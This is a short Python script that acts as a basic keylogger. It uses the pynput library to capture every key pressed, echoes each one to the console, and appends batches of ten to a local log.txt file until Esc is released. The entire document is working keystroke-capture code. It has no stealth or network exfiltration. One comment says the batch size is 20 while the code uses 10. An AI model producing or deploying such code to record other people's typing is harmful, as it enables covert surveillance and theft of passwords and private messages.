from pynput.keyboard import Key, Listener
# from pynput library, keyboard package, importing Key and Listener classes #

# init global vars #
count = 0
keys = []

def on_press(key):
    global keys, count  # global vars 'keys' and 'count' established to reach outside of function #

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    # if count is greater than / equal to 20, reset count and keys #
    if count >= 10:
        count = 0
        writeToFile(keys)
        keys = []


# define function writeToFile, which takes argument 'keys' and #
# appends ('a') to log.txt, and replaces some things for clarity #
def writeToFile(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            if k.find("enter") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


# stops listener #
def on_release(key):
    if key == Key.esc:
        return False


# collect events until released #
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
